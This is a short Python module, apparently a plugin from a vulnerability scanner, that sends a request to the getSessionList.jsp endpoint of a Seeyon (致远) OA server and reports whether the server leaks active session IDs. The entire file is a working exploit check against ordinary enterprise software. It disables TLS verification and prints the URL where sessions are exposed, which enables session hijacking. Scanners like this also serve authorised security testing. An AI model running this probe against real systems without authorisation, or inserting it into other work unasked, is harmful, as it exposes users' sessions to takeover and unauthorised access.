import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 致远OA_getSessionList_Session泄漏(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "yyoa/ext/https/getSessionList.jsp?cmd=getAll"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "/yyoa/index.jsp" not in response.text and "<sessionID>" in response.text and response.status_code == 200:
            print(Vcolors.RED + "[SUCCESS] 目标存在致远OA getSessionList.jsp Session泄漏漏洞, Session地址: {}".format(vuln_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在致远OA getSessionList.jsp Session泄漏漏洞" + Vcolors.ENDC)
    except:
        logging.error("致远OA_getSessionList_Session泄漏脚本出现异常")


